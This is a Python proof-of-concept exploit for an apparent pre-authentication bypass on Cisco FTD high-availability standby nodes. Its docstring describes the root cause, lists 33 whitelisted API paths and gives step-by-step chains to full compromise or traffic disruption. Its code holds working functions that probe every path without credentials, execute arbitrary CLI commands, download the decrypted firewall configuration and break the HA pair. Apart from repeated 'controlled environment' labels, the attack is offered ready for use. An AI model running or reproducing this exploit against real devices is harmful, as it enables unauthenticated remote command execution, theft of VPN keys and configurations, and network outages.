"""
F-FTD-78: Pre-auth endpoint bypass on FTD HA standby nodes
CONTROLLED ENVIRONMENT ONLY

Root cause:
  resources-context.xml (inside resources.jar) registers 33 REST endpoints
  with metadata entry:
    <entry key="ha_standby_url_whitelist" value="true"/>

  DefaultNgfwHaWhiteListResourceStore reads this at startup and adds the
  corresponding API paths to an in-memory whitelist Set<String>.

  Security chain analysis:
    1. NgfwAccessTokenAuthFilter.doFilter() — ALWAYS calls filterChain.doFilter()
       regardless of whether a Bearer token is present. Unauthenticated requests
       receive NgfwNullAccessTokenAuth in SecurityContext (authenticated=false).
    2. Whitelisted URL check — Spring Security configuration uses the whitelist
       to bypass normal authentication enforcement for these 33 paths.
    3. On HA standby nodes specifically: these endpoints accept requests from
       NgfwNullAccessTokenAuth (anonymous) callers.

  Condition: FTD must be in HA (active/standby) configuration.
  Both nodes share management interfaces; standby is typically less monitored.

HIGH-IMPACT ENDPOINTS:
  POST /api/fdm/v6/action/command
    → CommandResource.createEntity() → OperationalEntityService.create()
    → Sends commandInput string to FTD CLI executor (lina/bash execution layer)
    → Max 2 concurrent semaphore permits (rate limit, not auth gate)
    → Payload: {"commandInput": "<cli-command>"}
    → Response includes commandOutput (CLI output)
    IMPACT: **RCE on HA standby FTD without authentication**

  GET /api/fdm/v6/action/exportconfig
    → ExportConfigFileDownloadResource → ExportConfigFileService.getFileIfExists()
    → Returns decrypted config.txt (full FTD firewall configuration)
    → Content-Disposition: attachment; filename=config.txt
    IMPACT: Full config exfiltration including ACLs, VPN pre-shared keys, routes

  GET /api/fdm/v6/action/downloadbackup/{objId}
    → Downloads backup archive (may contain creds, certificates, config)
    IMPACT: Full system backup exfiltration

  POST /api/fdm/v6/devices/default/action/ha/failover
  POST /api/fdm/v6/devices/default/action/ha/break
  POST /api/fdm/v6/devices/default/action/ha/reset
  POST /api/fdm/v6/devices/default/action/ha/suspend
    → Disrupts HA pair, forces failover, breaks active/standby state
    IMPACT: DoS against active FTD node via forced failover

  POST /api/fdm/v6/action/upgrade
  POST /api/fdm/v6/action/uploadupgrade
    → Triggers or uploads firmware upgrade package
    IMPACT: Potential persistent access via malicious firmware replacement

FULL LIST OF 33 HA-WHITELISTED PATHS (from resources-context.xml):
  /action/command                      <- RCE
  /action/interfacescan
  /devicesettings/default/managementips
  /devicesettings/default/managementips/{objId}
  /devices/default/action/ha/break
  /devices/default/action/ha/break/{objId}
  /devices/default/action/ha/resume
  /devices/default/action/ha/suspend
  /devices/default/action/ha/failover
  /devices/default/action/ha/reset
  /action/exportconfig                 <- config exfil
  /action/backup
  /action/backup/{objId}
  /action/restore
  /action/restore/{objId}
  /managedentity/archivedbackups
  /managedentity/archivedbackups/{objId}
  /action/updategeolocation
  /action/updategeolocation/{objId}
  /action/updatesrufromfile            <- SRU/zip-slip (links to F-FTD-66)
  /action/troubleshoot
  /managedentity/jobs/troubleshootjob
  /managedentity/jobs/troubleshootjob/{objId}
  /action/troubleshoot/{objId}
  /action/pullupgrade
  /action/pullfile
  /managedentity/upgradefiles
  /managedentity/upgradefiles/{objId}
  /action/upgrade                      <- firmware control
  /action/revertupgrade
  /operational/upgraderevertinfo/{objId}
  /action/downloadbackup/{objId}       <- backup exfil
  /action/uploadupgrade                <- firmware upload

Chain to full compromise (no prior auth required):
  Step 1: Identify FTD in HA configuration (FMC cert pivot / Shodan HA banner)
  Step 2: Target STANDBY node (management IP from FMC config or network scan)
  Step 3: POST /api/fdm/v6/action/command {"commandInput": "show run"} -> config
  Step 4: Or GET /api/fdm/v6/action/exportconfig -> full config.txt download

Alternatively (destruction path):
  Step 3: POST /api/fdm/v6/devices/default/action/ha/break -> HA pair dissolved
  Step 4: Active node now standalone; resiliency eliminated
  Step 5: POST /api/fdm/v6/devices/default/action/ha/failover -> force failover to
          already-broken standby -> both nodes go active -> traffic disruption

Link to F-FTD-66 (SRU update):
  /action/updatesrufromfile is in the whitelist — can push malicious SRU package
  to standby without auth. Combined with F-FTD-66 zip-slip and verify bypass
  (F-FTD-71 -u flag): signature-free SRU injection pre-auth on standby.

Affected: FTD 6.7.0-65 (resources-context.xml confirmed in resources.jar)
Condition: HA active/standby deployment, standby management interface reachable
Auth required: NONE on standby node for whitelisted endpoints
"""

# CONTROLLED ENVIRONMENT ONLY

import requests
import sys
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FDM_API_BASE = "/api/fdm/v6"

HA_WHITELIST_PATHS = [
    "/action/command",
    "/action/interfacescan",
    "/devicesettings/default/managementips",
    "/devicesettings/default/managementips/default",
    "/devices/default/action/ha/break",
    "/devices/default/action/ha/resume",
    "/devices/default/action/ha/suspend",
    "/devices/default/action/ha/failover",
    "/devices/default/action/ha/reset",
    "/action/exportconfig",
    "/action/backup",
    "/managedentity/archivedbackups",
    "/action/updategeolocation",
    "/action/updatesrufromfile",
    "/action/troubleshoot",
    "/managedentity/jobs/troubleshootjob",
    "/action/pullupgrade",
    "/action/pullfile",
    "/managedentity/upgradefiles",
    "/action/upgrade",
    "/action/revertupgrade",
    "/operational/upgraderevertinfo/default",
    "/action/uploadupgrade",
]


def probe_ha_bypass(host, port=443):
    """
    Probe all HA-whitelisted endpoints without authentication.
    CONTROLLED ENVIRONMENT ONLY.
    """
    base = f"https://{host}:{port}{FDM_API_BASE}"
    print(f"[*] F-FTD-78: Probing HA standby bypass on {host}:{port}")
    print(f"    No Authorization header — testing NgfwNullAccessTokenAuth path")
    print()

    results = {}
    for path in HA_WHITELIST_PATHS:
        url = base + path
        for method in ("GET", "POST"):
            try:
                r = requests.request(method, url, verify=False, timeout=8,
                                     json={} if method == "POST" else None)
                code = r.status_code
                # 401 = auth required (not bypassed), 403 = authz denied,
                # 200/201/400/405 = reached the handler (bypass confirmed)
                bypassed = code not in (401, 403)
                marker = "[!!!]" if bypassed else "[-]  "
                print(f"  {marker} {method:4} {path}: HTTP {code}")
                results[f"{method} {path}"] = code
                if bypassed:
                    break  # GET/POST both bypass; don't double-count
            except Exception as e:
                print(f"  [?]  {method:4} {path}: {e}")
            break  # Try GET first; POST if needed

    bypassed = {k: v for k, v in results.items() if v not in (401, 403)}
    print(f"\n[*] Bypassed: {len(bypassed)} / {len(HA_WHITELIST_PATHS)} probed")
    return bypassed


def exploit_command_exec(host, command_input, port=443):
    """
    POST /api/fdm/v6/action/command without auth -> CLI command execution.
    CONTROLLED ENVIRONMENT ONLY.
    """
    url = f"https://{host}:{port}{FDM_API_BASE}/action/command"
    payload = {
        "commandInput": command_input,
        "type": "Command"
    }
    print(f"[*] F-FTD-78 / command exec: POST {url}")
    print(f"    Command: {command_input}")
    print(f"    NO Authorization header")

    try:
        r = requests.post(url, json=payload, verify=False, timeout=30)
        print(f"[*] HTTP {r.status_code}")
        if r.status_code in (200, 201):
            resp = r.json()
            output = resp.get("commandOutput", "")
            print(f"[!!!] COMMAND EXECUTED — output ({len(output)} chars):")
            print(output[:2000])
            return output
        else:
            print(f"[-] Response: {r.text[:500]}")
            return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def exploit_config_export(host, output_path=None, port=443):
    """
    GET /api/fdm/v6/action/exportconfig without auth -> download config.txt.
    Returns decrypted full FTD configuration.
    CONTROLLED ENVIRONMENT ONLY.
    """
    url = f"https://{host}:{port}{FDM_API_BASE}/action/exportconfig"
    print(f"[*] F-FTD-78 / config export: GET {url}")
    print(f"    NO Authorization header")

    try:
        r = requests.get(url, verify=False, timeout=60, stream=True)
        print(f"[*] HTTP {r.status_code}")
        cd = r.headers.get("Content-Disposition", "")
        ct = r.headers.get("Content-Type", "")
        print(f"    Content-Disposition: {cd}")
        print(f"    Content-Type: {ct}")

        if r.status_code == 200:
            data = r.content
            print(f"[!!!] CONFIG DOWNLOADED: {len(data)} bytes")
            if output_path:
                with open(output_path, "wb") as f:
                    f.write(data)
                print(f"    Saved to: {output_path}")
            else:
                print(data[:2000].decode("utf-8", errors="replace"))
            return data
        else:
            print(f"[-] Response: {r.text[:500]}")
            return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def exploit_ha_break(host, port=443):
    """
    POST /api/fdm/v6/devices/default/action/ha/break without auth -> break HA pair.
    CONTROLLED ENVIRONMENT ONLY. DESTRUCTIVE — only use in isolated lab.
    """
    url = f"https://{host}:{port}{FDM_API_BASE}/devices/default/action/ha/break"
    payload = {"type": "BreakHAStatus", "interfaceOption": "DISABLE_INTERFACES"}
    print(f"[*] F-FTD-78 / HA break: POST {url}")
    print(f"    DESTRUCTIVE — breaks HA pair configuration")
    print(f"    NO Authorization header")

    try:
        r = requests.post(url, json=payload, verify=False, timeout=30)
        print(f"[*] HTTP {r.status_code}")
        if r.status_code in (200, 201, 202):
            print(f"[!!!] HA BREAK ACCEPTED — pair dissolution initiated")
        print(f"    Response: {r.text[:500]}")
        return r.status_code
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-78: Pre-auth HA standby endpoint bypass")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print("""
Condition: FTD in HA active/standby configuration.
Target:    STANDBY node management interface.
Auth req:  NONE for 33 whitelisted endpoints.

Mechanism:
  resources-context.xml registers 33 paths with ha_standby_url_whitelist=true.
  DefaultNgfwHaWhiteListResourceStore loads these at startup.
  NgfwAccessTokenAuthFilter always passes requests through (never blocks).
  On standby, whitelisted paths bypass authentication enforcement.

Highest-impact endpoints:
  POST /action/command           -> CLI command execution (RCE)
  GET  /action/exportconfig      -> Full config download (config.txt, decrypted)
  GET  /action/downloadbackup/{} -> Backup archive download
  POST /devices/default/action/ha/failover -> Force failover (DoS)
  POST /devices/default/action/ha/break    -> Break HA pair (DoS)
  POST /action/uploadupgrade     -> Firmware upload

Link to F-FTD-66/71:
  /action/updatesrufromfile in whitelist = SRU push to standby pre-auth.
  Combined with -u sig bypass (F-FTD-71): malicious SRU to standby, no auth.
""")

    mode = sys.argv[1] if len(sys.argv) > 1 else "static"

    if mode == "probe":
        host = sys.argv[2]
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 443
        probe_ha_bypass(host, port)

    elif mode == "command":
        host = sys.argv[2]
        cmd = sys.argv[3] if len(sys.argv) > 3 else "show version"
        port = int(sys.argv[4]) if len(sys.argv) > 4 else 443
        exploit_command_exec(host, cmd, port)

    elif mode == "exportconfig":
        host = sys.argv[2]
        out = sys.argv[3] if len(sys.argv) > 3 else None
        port = int(sys.argv[4]) if len(sys.argv) > 4 else 443
        exploit_config_export(host, out, port)

    elif mode == "habreak":
        host = sys.argv[2]
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 443
        exploit_ha_break(host, port)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
